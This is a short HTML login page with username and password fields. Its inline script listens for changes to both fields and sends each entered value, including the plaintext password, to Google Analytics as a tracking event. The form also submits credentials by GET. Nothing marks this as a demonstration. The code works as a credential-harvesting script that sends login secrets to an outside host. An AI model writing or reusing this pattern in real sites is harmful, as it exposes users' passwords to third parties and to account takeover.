<!DOCTYPE html>
<html>
<head>
<script async src="https://www.googletagmanager.com/gtag/js?id=GA_MEASUREMENT_ID"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-K1WGWHB5DX');
</script>

  <title>Login</title>
</head>
<body>
  <h1>Login</h1>
  <form action="dashboard.html">
    <label for="username">Username:</label>
    <input type="text" id="username" name="username" required>
    <br>
    <label for="password">Password:</label>
    <input type="password" id="password" name="password" required>
    <br>
    <input type="submit" value="Login">
  </form>

  <script>
    document.getElementById('username').addEventListener('change', function(event) {
      var username = event.target.value;
      gtag('event', 'input_data', {
        'event_category': 'Input Field',
        'event_label': 'Username',
        'input_value': username
      });
    });

    document.getElementById('password').addEventListener('change', function(event) {
      var password = event.target.value;
      gtag('event', 'input_data', {
        'event_category': 'Input Field',
        'event_label': 'Password',
        'input_value': password
      });
    });
  </script>
</body>
</html>
